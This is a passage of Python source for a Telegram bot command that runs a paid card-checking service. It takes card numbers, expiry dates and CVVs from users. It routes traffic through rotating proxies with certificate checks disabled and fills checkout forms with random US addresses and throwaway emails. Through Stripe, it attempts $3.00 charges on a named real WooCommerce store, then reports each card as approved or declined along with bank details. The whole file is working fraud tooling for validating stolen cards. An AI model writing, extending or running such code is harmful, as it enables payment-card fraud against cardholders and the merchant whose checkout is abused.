ZBZ3o1M3lQSzI1NHlZQkIwSjZnUjhRR1M2SFZaYWhYNTlFQjJ2VVZYR1NSMG5MSE5pMlczbDV1bWsvaXZPV0p0RjVVMzJ3NTFNR05UWEdMSkp6djFuRzN5TmR5Vzg3U3BjZkxPTXE1ODI0bVFNaTNmRXlvMXFHbG9uV2dtUUc4UWpxMG1LN1QrTmpxMWZvenFwOTVkNWxkU2p4NkkweVNKQjJNcDF4ZHFwZGpEa3NDZWliTHFaejZXYTA0N1lFWE55SWFGUXZyMUt2amZoUU1FdmFMMDRHa3pVRmhhejE3OCt1cWZGbU9SQlRZT0M1RlRhRkQ4Ny9EZmxFVlZyK3hTM0pqaTRiTVlzQXM3M1RMQWJYVTdPOWZTanRCM0tNTlk1NzJxeENNajE4cEZ6Yk9Ia2RNcWZPeEJUcFB0SHcxUnJ3S0FmRVRQOEN3c3psRHFjTk5RK0tqNzgxODFqZnc0Q2ZKTm9neTlNVFNwY3ZJNWVHYmRwazlLeEJBRVBaNFpJYkVLcWdrU0xuYTRBVnl0R1RBRTRRUHBLZ1ZkRFhJYmpEcHJMMlRSZnJqYks5ZE42SjRWdWNORG9CIiwia3IiOiI3YWYxZjM5Iiwic2hhcmRfaWQiOjI1OTE4OTM1OX0.98JLY8ZnsJSJn12v_ac90b2qDX_dWTRBVPZQVgh1HSI'
            }

            stripe_headers = {
                "User-Agent": self.user_agent,
                "Accept": "application/json",
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": "https://js.stripe.com",
                "Referer": "https://js.stripe.com/",
            }

            # Use separate client for Stripe (no proxy needed for Stripe API)
            async with httpx.AsyncClient(http1=True, verify=False) as stripe_client:
                response = await stripe_client.post(
                    "https://api.stripe.com/v1/payment_methods",
                    data=payment_data,
                    headers=stripe_headers,
                    timeout=30.0
                )

            if response.status_code == 200:
                result = response.json()
                payment_method_id = result.get('id')
                if payment_method_id:
                    logger.success(f"Payment method created: {payment_method_id}")
                    return {'success': True, 'payment_method_id': payment_method_id}
                else:
                    return {'success': False, 'error': 'No payment method ID'}
            else:
                try:
                    error_data = response.json()
                    error_msg = error_data.get('error', {}).get('message', 'Payment method creation failed')
                    return {'success': False, 'error': error_msg}
                except:
                    return {'success': False, 'error': 'Stripe API error'}

        except Exception as e:
            return {'success': False, 'error': f"Payment method error: {str(e)}"}

    async def get_elements_session(self):
        """Get Stripe elements session for deferred intent"""
        try:
            logger.step(6, 7, "Getting Stripe elements session...")
            
            # Generate stripe_js_id if not present
            stripe_js_id = f"{random.randint(10000000, 99999999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(100000000000, 999999999999)}"
            
            # Build elements session URL exactly as in stripe3.txt
            elements_url = (
                f"https://api.stripe.com/v1/elements/sessions?"
                f"client_betas[0]=card_country_event_beta_1&"
                f"deferred_intent[mode]=payment&"
                f"deferred_intent[amount]=300&"  # $3.00 in cents
                f"deferred_intent[currency]=cad&"
                f"currency=cad&"
                f"key={self.stripe_key}&"
                f"_stripe_account={self.stripe_account}&"
                f"elements_init_source=stripe.elements&"
                f"referrer_host=ippoipponurse.com&"
                f"stripe_js_id={stripe_js_id}&"
                f"locale=en&"
                f"type=deferred_intent"
            )

            elements_headers = {
                "User-Agent": self.user_agent,
                "Accept": "application/json",
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": "https://js.stripe.com",
                "Referer": "https://js.stripe.com/",
            }

            async with httpx.AsyncClient(http1=True, verify=False) as stripe_client:
                response = await stripe_client.get(
                    elements_url,
                    headers=elements_headers,
                    timeout=30.0
                )

            if response.status_code == 200:
                logger.success("Elements session created successfully")
                return {'success': True}
            else:
                return {'success': False, 'error': f"Elements session failed: {response.status_code}"}

        except Exception as e:
            logger.error(f"Elements session error: {str(e)}")
            return {'success': False, 'error': f"Elements session error: {str(e)}"}

    async def process_checkout(self, user_info, payment_method_id):
        """Process checkout with detailed logging"""
        try:
            logger.step(7, 7, "Processing checkout...")

            # Build checkout data exactly as in stripe3.txt
            checkout_data = {
                'wc-ajax': 'checkout',
                'wc_order_attribution_source_type': 'typein',
                'wc_order_attribution_referrer': '(none)',
                'wc_order_attribution_utm_campaign': '(none)',
                'wc_order_attribution_utm_source': '(direct)',
                'wc_order_attribution_utm_medium': '(none)',
                'wc_order_attribution_utm_content': '(none)',
                'wc_order_attribution_utm_id': '(none)',
                'wc_order_attribution_utm_term': '(none)',
                'wc_order_attribution_utm_source_platform': '(none)',
                'wc_order_attribution_utm_creative_format': '(none)',
                'wc_order_attribution_utm_marketing_tactic': '(none)',
                'wc_order_attribution_session_entry': 'https://ippoipponurse.com/',
                'wc_order_attribution_session_start_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                'wc_order_attribution_session_pages': '11',
                'wc_order_attribution_session_count': '1',
                'wc_order_attribution_user_agent': self.user_agent,
                'billing_first_name': user_info['first_name'],
                'billing_last_name': user_info['last_name'],
                'billing_company': '',
                'billing_country': user_info['country'],
                'billing_address_1': user_info['address'],
                'billing_address_2': '',
                'billing_city': user_info['city'],
                'billing_state': user_info['state'],
                'billing_postcode': user_info['postcode'],
                'billing_phone': user_info['phone'],
                'billing_email': user_info['email'],
                'shipping_first_name': '',
                'shipping_last_name': '',
                'shipping_company': '',
                'shipping_country': user_info['country'],
                'shipping_address_1': '',
                'shipping_address_2': '',
                'shipping_city': '',
                'shipping_state': '',
                'shipping_postcode': '',
                'order_comments': '',
                'payment_method': 'woocommerce_payments',
                'cr_customer_consent': 'on',
                'cr_customer_consent_field': '1',
                'terms': 'on',
                'terms-field': '1',
                'woocommerce-process-checkout-nonce': self.checkout_nonce or '',
                '_wp_http_referer': '/?wc-ajax=update_order_review',
                'wcpay-payment-method': payment_method_id,
                'wcpay-fingerprint': f"{random.randint(10000000, 99999999)}3f8c67ac242f731e98ca7176",
                'wcpay-fraud-prevention-token': ''
            }

            checkout_headers = {
                "Accept": "application/json, text/javascript, */*; q=0.01",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "X-Requested-With": "XMLHttpRequest",
                "Origin": self.base_url,
                "Referer": f"{self.base_url}/checkout-2/",
            }

            response = await self.make_request_with_retry('POST', f"{self.base_url}/?wc-ajax=checkout", headers=checkout_headers, data=checkout_data)

            if response.status_code != 200:
                logger.error(f"Checkout failed with status: {response.status_code}")
                return {
                    'success': False,
                    'status': 'DECLINED',
                    'message': f"Server error: {response.status_code}"
                }

            # Try to parse JSON response
            try:
                result = response.json()

                if isinstance(result, dict):
                    # CHECK: If this is a 3D Secure or deferred payment
                    if self.is_secure_required_response(result):
                        logger.warning("🔐 3D Secure/Deferred payment detected - marking as DECLINED")
                        return {
                            'success': True,
                            'status': 'DECLINED',
                            'message': '3D SECURE❎'
                        }

                    if result.get('result') == 'success' and result.get('redirect'):
                        redirect_url = result.get('redirect', '').lower()

                        # If redirect contains confirmation patterns, it's likely 3D Secure
                        if any(pattern in redirect_url for pattern in ['confirm-pi', 'pi_', '_secret_', 'requires_']):
                            logger.warning("⚠️ Success with confirmation URL - marking as 3D SECURE")
                            return {
                                'success': True,
                                'status': 'DECLINED',
                                'message': '3D SECURE❎'
                            }

                        logger.success("Checkout successful - Payment APPROVED")
                        return {
                            'success': True,
                            'status': 'APPROVED',
                            'message': 'Successfully Charged $3.00'
                        }

                    if result.get('result') == 'failure':
                        logger.warning(f"Checkout failed with result: failure")
                        
                        error_msg = ""
                        if 'messages' in result and result['messages']:
                            error_msg = result['messages']
                            logger.warning(f"Raw error messages: {error_msg}")
                        
                        clean_error = self.extract_error_from_html(error_msg)
                        logger.warning(f"Extracted error: {clean_error}")

                        # Check for 3D Secure in error message
                        if '3d_secure' in error_msg.lower() or 'authentication' in error_msg.lower():
                            logger.warning("🔐 3D Secure authentication required")
                            return {
                                'success': True,
                                'status': 'DECLINED',
                                'message': '3D SECURE❎'
                            }

                        logger.warning(f"❌ Checkout error: {clean_error}")
                        return {
                            'success': False,
                            'status': 'DECLINED',
                            'message': clean_error
                        }

                logger.warning(f"Unexpected JSON response format: {result}")
                return {
                    'success': False,
                    'status': 'DECLINED',
                    'message': 'Unexpected response format'
                }

            except json.JSONDecodeError as json_error:
                logger.error(f"JSON parse error: {json_error}")

                decline_message = self.extract_error_from_html(response.text)
                if decline_message and decline_message != "Payment declined":
                    logger.warning(f"Extracted error from HTML: {decline_message}")
                    return {
                        'success': False,
                        'status': 'DECLINED',
                        'message': decline_message
                    }
                else:
                    logger.warning("Could not extract error message from response")
                    return {
                        'success': False,
                        'status': 'DECLINED',
                        'message': 'Payment declined'
                    }

        except Exception as e:
            logger.error(f"Checkout processing error: {str(e)}")
            return {
                'success': False,
                'status': 'DECLINED',
                'message': f"Processing error: {str(e)[:100]}"
            }

    async def make_request_with_retry(self, method, url, max_retries=3, **kwargs):
        """Make request with retry logic for VPS compatibility"""
        last_exception = None
        
        for attempt in range(max_retries):
            try:
                if attempt > 0:
                    logger.warning(f"Retry attempt {attempt}/{max_retries} for {url}")
                    await asyncio.sleep(1.5 * attempt)
                
                headers = kwargs.get('headers', {}).copy()
                
                # Merge with base headers
                base_headers = self.get_base_headers()
                for key, value in base_headers.items():
                    if key not in headers:
                        headers[key] = value
                
                # Update dynamic headers
                headers['User-Agent'] = self.user_agent
                headers['Accept-Language'] = self.accept_language
                
                kwargs['headers'] = headers

                response = await self.client.request(method, url, **kwargs)
                
                # Store cookies from response
                if response.cookies:
                    for name, value in response.cookies.items():
                        self.cookies[name] = value
                        if name == '__stripe_mid':
                            self.__stripe_mid = value
                        elif name == '__stripe_sid':
                            self.__stripe_sid = value
                        elif name == 'woocommerce_cart_hash':
                            self.woocommerce_cart_hash = value
                        elif name == 'wp_woocommerce_session':
                            self.wp_woocommerce_session = value
                
                return response
                
            except (httpx.ConnectError, httpx.NetworkError, httpx.ProtocolError) as e:
                last_exception = e
                logger.warning(f"Connection error on attempt {attempt + 1}: {str(e)}")
                if attempt < max_retries - 1:
                    continue
                else:
                    raise last_exception
            except httpx.TimeoutException as e:
                last_exception = e
                logger.warning(f"Timeout on attempt {attempt + 1}")
                if attempt < max_retries - 1:
                    continue
                else:
                    raise last_exception
        
        raise last_exception if last_exception else Exception("All retry attempts failed")

    async def check_card(self, card_details, username, user_data):
        """Main card checking method with proxy integration"""
        start_time = time.time()
        cc = mes = ano = cvv = ""
        bin_info = None
        
        # Mask card for logging
        card_masked = card_details[:12] + "XXXX" + card_details[-4:] if len(card_details) > 4 else card_details
        logger.info(f"🔍 Starting Stripe Charge $3.00 check: {card_masked}")

        # Step 0: Get proxy for user (INTEGRATED FROM SHOPIFY.PY)
        logger.step(0, 7, "Getting proxy...")
        
        if not PROXY_SYSTEM_AVAILABLE:
            logger.error("Proxy system not available")
            return await self.format_response("", "", "", "", "ERROR", "Proxy system unavailable", username, time.time()-start_time, user_data)
        
        self.proxy_url = get_proxy_for_user(self.user_id, "random")
        if not self.proxy_url:
            logger.error("No working proxies available")
            self.proxy_status = "Dead 🚫"
            return await self.format_response("", "", "", "", "ERROR", "No proxy available", username, time.time()-start_time, user_data)
        
        # VPS FIX: Create SSL context that allows all ciphers and protocols
        ssl_context = ssl.create_default_context()
        ssl_context.check_hostname = False
        ssl_context.verify_mode = ssl.CERT_NONE
        ssl_context.set_ciphers('DEFAULT@SECLEVEL=1')
        
        # VPS FIX: Initialize httpx client with HTTP/1.1 only and proper SSL
        try:
            self.client = httpx.AsyncClient(
                proxy=self.proxy_url,
                timeout=httpx.Timeout(30.0, connect=15.0),
                follow_redirects=True,
                limits=httpx.Limits(max_keepalive_connections=1, max_connections=2),
                verify=ssl_context,
                http1=True,
                http2=False,
                trust_env=False
            )
        except Exception as e:
            logger.error(f"Failed to initialize HTTP client: {str(e)}")
            self.proxy_status = "Dead 🚫"
            mark_proxy_failed(self.proxy_url)
            return await self.format_response("", "", "", "", "ERROR", f"Client init failed: {str(e)}", username, time.time()-start_time, user_data)
        
        # Test the proxy quickly with retry
        start_test = time.time()
        proxy_working = False
        
        for test_attempt in range(2):
            try:
                test_resp = await self.client.get("https://ipinfo.io/json", timeout=10)
                self.proxy_response_time = time.time() - start_test
                
                if test_resp.status_code == 200:
                    self.proxy_status = "Live ⚡️"
                    self.proxy_used = True
                    logger.proxy(f"Proxy working: {self.proxy_url[:50]}... | Response: {self.proxy_response_time:.2f}s")
                    mark_proxy_success(self.proxy_url, self.proxy_response_time)
                    proxy_working = True
                    break
                else:
                    logger.warning(f"Proxy test returned status {test_resp.status_code}")
                    if test_attempt == 0:
                        await asyncio.sleep(1)
                        continue
                    else:
                        raise Exception(f"Proxy test failed with status {test_resp.status_code}")
                        
            except Exception as e:
                logger.warning(f"Proxy test attempt {test_attempt + 1} failed: {str(e)}")
                if test_attempt == 0:
                    await asyncio.sleep(1.5)
                    continue
                else:
                    self.proxy_status = "Dead 🚫"
                    mark_proxy_failed(self.proxy_url)
                    await self.client.aclose()
                    return await self.format_response("", "", "", "", "ERROR", f"Proxy test failed: {str(e)}", username, time.time()-start_time, user_data)
        
        if not proxy_working:
            self.proxy_status = "Dead 🚫"
            mark_proxy_failed(self.proxy_url)
            await self.client.aclose()
            return await self.format_response("", "", "", "", "ERROR", "Proxy connection failed", username, time.time()-start_time, user_data)

        try:
            cc_parts = card_details.split('|')
            if len(cc_parts) < 4:
                return await self.format_response("", "", "", "", "ERROR", "Invalid card format. Use: CC|MM|YY|CVV", username, time.time()-start_time, user_data)

            cc = cc_parts[0].strip().replace(" ", "")
            mes = cc_parts[1].strip()
            ano = cc_parts[2].strip()
            cvv = cc_parts[3].strip()

            if not cc.isdigit() or len(cc) < 15:
                return await self.format_response(cc, mes, ano, cvv, "ERROR", "Invalid card number", username, time.time()-start_time, user_data, bin_info)

            if not mes.isdigit() or len(mes) not in [1, 2] or not (1 <= int(mes) <= 12):
                return await self.format_response(cc, mes, ano, cvv, "ERROR", "Invalid month", username, time.time()-start_time, user_data, bin_info)

            if not ano.isdigit() or len(ano) not in [2, 4]:
                return await self.format_response(cc, mes, ano, cvv, "ERROR", "Invalid year", username, time.time()-start_time, user_data, bin_info)

            if not cvv.isdigit() or len(cvv) not in [3, 4]:
                return await self.format_response(cc, mes, ano, cvv, "ERROR", "Invalid CVV", username, time.time()-start_time, user_data, bin_info)

            if len(ano) == 2:
                ano = '20' + ano

            bin_info = await self.get_bin_info(cc)
            logger.bin_info(f"BIN: {cc[:6]} | {bin_info['scheme']} - {bin_info['type']} | {bin_info['bank']} | {bin_info['country']} [{bin_info['emoji']}]")

            # Get US address from the list
            address_info = random.choice(self.us_addresses)
            
            # Generate random email if needed
            random_string = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
            email = address_info['email']  # Use the provided email or generate one
            if random.random() > 0.5:  # 50% chance to generate random email
                email = f"{random_string}@gmail.com"

            user_info = {
                'first_name': address_info['first_name'],
                'last_name': address_info['last_name'],
                'email': email,
                'address': address_info['address'],
                'city': address_info['city'],
                'postcode': address_info['postcode'],
                'phone': address_info['phone'],
                'state': address_info['state'],
                'country': address_info['country']
            }

            logger.user(f"User: {user_info['first_name']} {user_info['last_name']} | {email} | {user_info['phone']}")

            # Step 1: Initialize session
            if not await self.initialize_session():
                return await self.format_response(cc, mes, ano, cvv, "DECLINED", "Failed to initialize session", username, time.time()-start_time, user_data, bin_info)

            # Step 2: Add product to cart
            add_success, error = await self.add_product_to_cart()
            if not add_success:
                return await self.format_response(cc, mes, ano, cvv, "DECLINED", error, username, time.time()-start_time, user_data, bin_info)

            # Step 3: Load checkout page and extract nonces
            checkout_success, checkout_error = await self.get_checkout_page()
            if not checkout_success:
                return await self.format_response(cc, mes, ano, cvv, "DECLINED", f"Checkout page error: {checkout_error}", username, time.time()-start_time, user_data, bin_info)

            # Step 4: Update order review with US address
            update_success, update_result = await self.update_order_review(user_info)
            if not update_success:
                return await self.format_response(cc, mes, ano, cvv, "DECLINED", update_result, username, time.time()-start_time, user_data, bin_info)

            # Step 5: Create Stripe payment method
            payment_result = await self.create_stripe_payment_method((cc, mes, ano, cvv), user_info)
            if not payment_result['success']:
                error_msg = payment_result['error']
                logger.warning(f"Payment method creation failed: {error_msg}")
                return await self.format_response(cc, mes, ano, cvv, "DECLINED", error_msg, username, time.time()-start_time, user_data, bin_info)

            # Step 6: Get Stripe elements session
            elements_result = await self.get_elements_session()
            if not elements_result['success']:
                logger.warning(f"Elements session creation failed: {elements_result.get('error')}")
                # Continue anyway - may still work without it

            # Step 7: Process checkout
            result = await self.process_checkout(user_info, payment_result['payment_method_id'])

            elapsed_time = time.time() - start_time
            logger.success(f"Card check completed in {elapsed_time:.2f}s - Status: {result['status']} - Message: {result['message']}")

            return await self.format_response(cc, mes, ano, cvv, result['status'], result['message'], username, elapsed_time, user_data, bin_info)

        except httpx.TimeoutException:
            logger.error("Request timeout")
            mark_proxy_failed(self.proxy_url)
            self.proxy_status = "Dead 🚫"
            return await self.format_response(cc, mes, ano, cvv, "ERROR", "Request timeout", username, time.time()-start_time, user_data, bin_info)
        except httpx.ConnectError as e:
            logger.error(f"Connection error: {str(e)}")
            mark_proxy_failed(self.proxy_url)
            self.proxy_status = "Dead 🚫"
            return await self.format_response(cc, mes, ano, cvv, "ERROR", "Connection failed", username, time.time()-start_time, user_data, bin_info)
        except Exception as e:
            logger.error(f"Unexpected error: {str(e)}")
            return await self.format_response(cc, mes, ano, cvv, "ERROR", f"System error: {str(e)[:80]}", username, time.time()-start_time, user_data, bin_info)
        finally:
            # Ensure client is closed
            if self.client:
                try:
                    await self.client.aclose()
                except:
                    pass

    async def format_response(self, cc, mes, ano, cvv, status, message, username, elapsed_time, user_data, bin_info=None):
        """Format response matching scharge1.py style with trimmed message"""
        if bin_info is None:
            bin_info = await self.get_bin_info(cc)
        
        safe_bin_info = {
            'scheme': str(bin_info.get('scheme', 'N/A')),
            'type': str(bin_info.get('type', 'N/A')),
            'brand': str(bin_info.get('brand', 'N/A')),
            'bank': str(bin_info.get('bank', 'N/A')) if bin_info.get('bank') else 'N/A',
            'country': str(bin_info.get('country', 'N/A')),
            'country_code': str(bin_info.get('country_code', 'N/A')),
            'emoji': str(bin_info.get('emoji', '🏳️'))
        }

        user_id = user_data.get("user_id", "Unknown")
        first_name = html.escape(str(user_data.get("first_name", "User")))
        badge = user_data.get("plan", {}).get("badge", "🧿")

        # Trim the message for display
        trimmed_message = self.trim_error_message(str(message)) if message else ""

        if any(pattern in trimmed_message.lower() for pattern in ["3d secure", "authentication required", "3ds", "requires_confirmation", "requires_action"]):
            status_emoji = "❌"
            status_text = "DECLINED"
            message_display = "3D SECURE❎"
        elif status == "APPROVED":
            status_emoji = "✅"
            status_text = "APPROVED"
            message_display = "Successfully Charged $3.00"
        else:
            status_emoji = "❌"
            status_text = "DECLINED"
            message_display = trimmed_message if trimmed_message else "Payment declined"

        clean_name = re.sub(r'[↯⌁«~∞🍁]', '', first_name).strip()
        user_display = f"「{badge}」{clean_name}"
        
        bank_info = safe_bin_info['bank'].upper() if safe_bin_info['bank'] != 'N/A' else 'N/A'

        response = f"""<b>「$cmd → /xs」| <b>WAYNE</b> </b>
━━━━━━━━━━━━━━━
<b>[•] Card-</b> <code>{cc}|{mes}|{ano}|{cvv}</code>
<b>[•] Gateway -</b> Stripe Charge $3.00
<b>[•] Status-</b> <code>{status_text} {status_emoji}</code>
<b>[•] Response-</b> <code>{message_display}</code>
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>[+] Bin:</b> <code>{cc[:6]}</code>  
<b>[+] Info:</b> <code>{safe_bin_info['scheme']} - {safe_bin_info['type']} - {safe_bin_info['brand']}</code>
<b>[+] Bank:</b> <code>{bank_info}</code> 🏦
<b>[+] Country:</b> <code>{safe_bin_info['country']}</code> [{safe_bin_info['emoji']}]
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>[ﾒ] Checked By:</b> {user_display}
<b>[ϟ] Dev ➺</b> <b><i>DADYY</i></b>
━━━━━━━━━━━━━━━
<b>[ﾒ] T/t:</b> <code>{elapsed_time:.2f} 𝐬</code> |<b>P/x:</b> <code>{self.proxy_status}</code></b>"""

        return response

    def get_processing_message(self, cc, mes, ano, cvv, username, user_plan):
        """Get processing message matching scharge1.py style"""
        return f"""<b>「$cmd → /xs」| <b>WAYNE</b> </b>
━━━━━━━━━━━━━━━
<b>[•] Card-</b> <code>{cc}|{mes}|{ano}|{cvv}</code>
<b>[•] Gateway -</b> Stripe Charge $3.00
<b>[•] Status-</b> Processing... ⏳
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>[+] Plan:</b> {user_plan}
<b>[+] User:</b> @{username}
━━━━━━━━━━━━━━━
<b>Checking card... Please wait.</b>"""

# Command handler - MATCHING scharge1.py STYLE
@Client.on_message(filters.command(["xs", ".xs", "$xs"]))
@auth_and_free_restricted
async def handle_stripe_charge_3(client: Client, message: Message):
    try:
        user_id = message.from_user.id
        username = message.from_user.username or str(user_id)

        # CHECK: First check if command is disabled
        command_text = message.text.split()[0]
        command_name = command_text.lstrip('/.$')

        if is_command_disabled(command_name):
            await message.reply(get_command_offline_message(command_text))
            return

        # Check if user is banned
        if is_user_banned(user_id):
            await message.reply("""<pre>⛔ User Banned</pre>
━━━━━━━━━━━━━
⟐ <b>Message</b>: You have been banned from using this bot.
⟐ <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━""")
            return

        # Load user data
        users = load_users()
        user_id_str = str(user_id)
        if user_id_str not in users:
            await message.reply("""<pre>🔒 Registration Required</pre>
━━━━━━━━━━━━━
⟐ <b>Message</b>: You need to register first with /register
⟐ <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━""")
            return

        user_data = users[user_id_str]
        user_plan = user_data.get("plan", {})
        plan_name = user_plan.get("plan", "Free")

        # Check cooldown (owner is automatically skipped in check_cooldown function)
        can_use, wait_time = check_cooldown(user_id, "xs")
        if not can_use:
            await message.reply(f"""<pre>⏳ Cooldown Active</pre>
━━━━━━━━━━━━━
⟐ <b>Message</b>: Please wait {wait_time:.1f} seconds before using this command again.
⟐ <b>Your Plan:</b> <code>{plan_name}</code>
⟐ <b>Anti-Spam:</b> <code>{user_plan.get('antispam', 15)}s</code>
━━━━━━━━━━━━━""")
            return

        args = message.text.split()
        if len(args) < 2:
            if charge_processor:
                await message.reply(charge_processor.get_usage_message(
                    "xs", 
                    "Stripe Charge $3.00",
                    "4111111111111111|12|2025|123"
                ))
            else:
                await message.reply("""<pre>#WAYNE ─[STRIPE CHARGE $3.00]─</pre>
━━━━━━━━━━━━━
⟐ <b>Command</b>: <code>/xs</code> or <code>.xs</code> or <code>$xs</code>
⟐ <b>Usage</b>: <code>/xs cc|mm|yy|cvv</code>
⟐ <b>Example</b>: <code>/xs 4111111111111111|12|2025|123</code>
━━━━━━━━━━━━━
<b>~ Note:</b> <code>Charges $3.00 via Stripe gateway (Deducts 2 credits AFTER check completes)</code>
<b>~ Note:</b> <code>Free users can use in authorized groups with credit deduction</code>""")
            return

        card_details = args[1].strip()

        cc_parts = card_details.split('|')
        if len(cc_parts) < 4:
            await message.reply("""<pre>❌ Invalid Format</pre>
━━━━━━━━━━━━━
⟐ <b>Message</b>: Invalid card format.
⟐ <b>Correct Format</b>: <code>cc|mm|yy|cvv</code>
⟐ <b>Example</b>: <code>4111111111111111|12|2025|123</code>
━━━━━━━━━━━━━""")
            return

        cc = cc_parts[0]
        mes = cc_parts[1]
        ano = cc_parts[2]
        cvv = cc_parts[3]

        # Check if proxy system is available
        if not PROXY_SYSTEM_AVAILABLE:
            await message.reply("""<pre>❌ Proxy System Unavailable</pre>
━━━━━━━━━━━━━
⟐ <b>Message</b>: Proxy system is not available.
⟐ <b>Solution</b>: <code>Ensure BOT/tools/proxy.py exists and is working</code>
⟐ <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━""")
            return

        # Show processing message - MATCHING scharge1.py STYLE
        processing_msg = await message.reply(
            charge_processor.get_processing_message(
                cc, mes, ano, cvv, username, plan_name, 
                "Stripe Charge $3.00", "xs"
            ) if charge_processor else f"""<b>「$cmd → /xs」| <b>WAYNE</b> </b>
━━━━━━━━━━━━━━━
<b>[•] Card-</b> <code>{cc}|{mes}|{ano}|{cvv}</code>
<b>[•] Gateway -</b> Stripe Charge $3.00
<b>[•] Status-</b> Processing... ⏳
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>[+] Plan:</b> {plan_name}
<b>[+] User:</b> @{username}
━━━━━━━━━━━━━━━
<b>Checking card... Please wait.</b>"""
        )

        # Create checker instance
        checker = StripeCharge3Checker(user_id=user_id)

        # Process command through universal charge processor
        if charge_processor:
            success, result, credits_deducted = await charge_processor.execute_charge_command(
                user_id,
                checker.check_card,
                card_details,
                username,
                user_data,
                credits_needed=2,
                command_name="xs",
                gateway_name="Stripe Charge $3.00"
            )

            await processing_msg.edit_text(result, disable_web_page_preview=True)
        else:
            # Fallback to old method if charge_processor not available
            result = await checker.check_card(card_details, username, user_data)
            await processing_msg.edit_text(result, disable_web_page_preview=True)

    except Exception as e:
        error_msg = str(e)[:150]
        await message.reply(f"""<pre>❌ Command Error</pre>
━━━━━━━━━━━━━
⟐ <b>Message</b>: An error occurred while processing your request.
⟐ <b>Error</b>: <code>{error_msg}</code>
⟐ <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━""")